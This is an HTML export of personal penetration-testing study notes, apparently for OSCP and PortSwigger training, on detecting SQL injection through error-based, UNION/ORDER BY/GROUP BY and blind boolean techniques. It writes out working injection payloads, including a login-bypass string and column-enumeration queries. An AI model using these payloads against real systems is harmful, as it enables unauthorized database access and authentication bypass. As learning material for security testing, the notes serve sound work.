<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Detection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Detection</h1><br/><p>[OSCP 64-65 &amp; PortSwigger 76-79]</p><p></p><p>Test all contexts/&quot;entry points&quot; (where user input goes), like each <span style="color:#57e389;">Form field</span>, each <span style="color:#57e389;">URL param</span>,<span style="color:#57e389;"> HTTP Headers</span>, etc.</p><p></p><p>There may be <span style="color:#ff0000;">Req&#39;s that occur “behind the scenes” </span>(e.g fetching an image for the webpg) that are picked up in the <span style="color:#ff0000;">DevTools Network tab</span>.</p><p></p><p><h1>Query Syntax</h1></p><p><h2>To Quote or Not to Quote</h2></p><p>[CTF D 2]</p><p></p><p>Depending on the context you may need to use:</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Single Quote</span>: SQLi vulns can often be detected by adding a single quote (<strong> &#39;</strong> ) to the query.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Double Quote</span>: Occasionally <span style="color:#ff0000;">double quotes</span> ( <strong>&quot;</strong> ) are needed <span style="color:#ff0000;">instead of single quotes</span>.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">No Quotes</span>: Even if you detected the vuln by adding <strong>&#39; </strong>or <strong>&quot;</strong>, you sometimes shouldn’t prepend them to your SQLi payloads.</p><p></p><p><h2>Valid Queries</h2></p><p>Often <span style="color:#ff0000;">NEED TO USE VALID QUERY</span> to detect vuln. (e.g if there are 10 users,  vuln may only appear if you append payload to <em>id=1 </em>instead of <em>id=99</em>).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can sometimes use a wildcard to guarantee valid query (e.g <em>id=</em><strong>% UNION SELECT</strong>...)</p><p></p><p><h2>Invalid Queries</h2></p><p>[CTF B 13-16]</p><p></p><p>It&#39;s less common, but you <span style="color:#ff0000;">may need to use invalid query</span> in specific situation.</p><p></p><p>For example, you should use an invalid query if you&#39;re testing <strong>OR</strong> payloads. (e.g. return results if <em>id=99</em> <strong>OR 1=1-- //</strong>) </p><p></p><p><h1>Error-Based</h1><h1> </h1><h1>Detection</h1></p><p>Append<span style="color:#62a0ea;"> </span><strong>&#39;</strong><span style="color:#62a0ea;"> </span>(or occasionally <strong>&quot;</strong>) to expected input &amp; look for error or anomaly.</p><p></p><p>If found, try adding SQL query w/o error. For ex,</p><p></p><p><em>http://site.com/user=offsec</em><strong>&#39; OR 1=1 -- //</strong></p><p></p><p><h2>What it indicates</h2></p><p>This may indicate an <a href="SQL--SQLi_Attacks--Error-Based_20.html">Error-Based SQLi</a> vuln, or one of the other categories of SQLi vuln depending on what is returned &amp; the target&#39;s implementation</p><p></p><p><h1>UNION/ORDER Detection</h1></p><p>If you can sort the pg&#39;s results, or get diff output (e.g ‘unknown column ’6&#39; in ‘order clause’) using the following, then the <a href="Recon_+_Services--WebApp_12.html">WebApp</a> is likely vuln to a <a href="SQL--SQLi_Attacks--Union_Attack_21.html">Union Attack </a>[Portswigger 60-64]</p><p><h2></h2></p><p><h2></h2><span style="color:#f66151;text-decoration:underline;">WARNING</span>: These methods are typically interchangeable, but sometimes <span style="color:#ff0000;">only 1 of the following methods will work</span>! Try <strong>UNION</strong>, <strong>ORDER</strong>, &amp; <strong>GROUP</strong> methods!<h2></h2></p><p><h2></h2><h2></h2></p><p><h2>ORDER BY</h2></p><p>These payloads rearrange the order by which columns are returned in the results set. If you specify a value &gt; # of columns, there&#39;s a diff in the Resp (i.e error or no data is returned) <span style="color:#ff0000;">check the source code</span> if needed.</p><p></p><p>Depending on implementation, may be able to determine # of columns in 1 query using a payload like-</p><p></p><p><em>id=1</em><strong>&#39; ORDER BY 1,2,3,4,5,6-- //</strong> (Output: “Error...unknown column ‘5’ in &#39;order clause&#39;” indicating that the target only has 4 columns). If this doesn&#39;t work, need to test 1 # at a time-</p><p></p><p><em>id=1</em><strong>&#39; ORDER BY 1-- //</strong></p><p><em>id=1</em><strong>&#39; ORDER BY 2-- //</strong></p><p><em>id=1</em><strong>&#39; ORDER BY 3-- //</strong> (etc)</p><p></p><p><h3>GROUP BY</h3></p><p>Typically, this can be used exactly the same way as the <strong>ORDER BY</strong> method (at least in MySQL, but possibly for other DBMS also). However, this can be an alternative method if <strong>ORDER BY</strong> is blocked.</p><p></p><p><em>id=1</em><strong>&#39; GROUP BY 1,2,3,4,5,6-- //</strong></p><p></p><p><em>id=1</em><strong>&#39; GROUP BY 1-- //</strong></p><p><em>id=1</em><strong>&#39; GROUP BY 3-- //</strong> (etc)</p><p></p><p><h2>UNION</h2></p><p>Lets you detect data-type of useable columns, so you know which can be used to return desired data.</p><p>NULL works with any data type, so iterate the # of NULL Columns in each subsequent query. (Don&#39;t think it matters whether there&#39;s a space following each <strong>NULL,</strong>)</p><p></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT NULL-- //</strong></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT NULL,NULL-- //</strong> (etc)</p><p></p><p>If the # of NULLs doesn&#39;t match the # of Columns, you&#39;ll get a diff in Resp  (i.e error or no data is returned) . </p><p>If the # of NULLs does match the # of Columns, you&#39;ll get one of the following indicators-</p><p></p><p><h3>Indicators</h3><ol><li>May see additional content within the Resp (e.g Extra Row on an HTML Table)</li><li>Null values could trigger a diff kind of error than the error returned when the #&#39;s didn&#39;t match (e.g &quot;Null Pointer Error&quot;)</li><li>Resp seems normal compared to baseline? (I think this is a possiblity, not 100% sure)</li><li>Worst case scenario: No diff btwn payloads that have correct &amp; incorrect #, making this method ineffective for detecting SQLi vuln</li></ol></p><p></p><p><h3>Test Data Type</h3></p><p>Assuming there are 4 columns in the table you&#39;re performing UNION statement against-</p><p></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT ‘apple&#39;,NULL,NULL,NULL-- //</strong></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT NULL,&#39;a&#39;,NULL,NULL-- //</strong></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT NULL,NULL,&#39;a&#39;,NULL-- //</strong></p><p><em>id=1</em><strong>&#39;</strong> <strong>UNION SELECT NULL,NULL,NULL,&#39;a&#39;-- //</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Result:</span> If the column&#39;s data type is compatible with string, the Resp should contain the injected value (may be hidden in source code, so it&#39;ll be easier to find if you use searchable string like “apple”). If the data type is incompatible, you&#39;ll get an error.</p><p></p><p><h1>Blind Detection</h1></p><p>[Portswigger 66-74]</p><p></p><p>DB Resp&#39;s aren&#39;t directly returned. 4 Methods of detecting<a href="SQL--SQLi_Attacks--Blind_2.html"> Blind SQLi</a></p><p></p><p><h2>Time-Based</h2><h2></h2></p><p><h2></h2>Try triggering a time delay. If you can, you may be able to trigger a time delay when a certain condition is true.</p><p><h2></h2></p><p><h2>Boolean Conditional Responses</h2><h2></h2></p><p><h2></h2>[CTF B 153]</p><p></p><p>See if you can trigger a difference in the HTTP Response returned by the Website depending on whether or not a a statement is true (Boolean Logic).</p><p></p><p><h3>Example- Combine with Login Bypass</h3></p><p>When using Burp&#39;s Repeater &amp; appending<strong> &#39; -- //</strong> to a valid username with an invalid password, Burpsuite gave the option to <strong>Follow Redirection</strong>, meaning that the Login Bypass worked.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">True Statement</span>: The Login Bypass still worked when a statement was true, like <strong> &#39; AND 1=1-- //</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">False Statement</span>: The Login Bypass no longer worked when the statement was false, like <strong>&#39; AND 1=2-- //</strong>. Instead for the error message <strong>Invalid username or password</strong>.</p><p></p><p>For example, the same thing applied to determining the number of columns in use. However, only the <strong>ORDER BY</strong> &amp; <strong>GROUP BY</strong> methods worked, but the <strong>UNION</strong> method DID NOT work here.</p><p></p><p><strong>&#39; ORDER BY 1,2,3,4-- //</strong> 	(The Login Bypass still worked)</p><p></p><p><strong>&#39; ORDER BY 1,2,3,4,5-- //</strong>	(The Login Bypass failed, indicating that there are 4 columns)</p><p><h2></h2></p><p><h2>Condtional Response via SQL Errors</h2><h2></h2></p><p><h2></h2><h2></h2></p><p><h2>Out-of-Band (OOB/OAST) Techniques</h2></p><p>{Not on OSCP}</p></div>
</body>
</html>
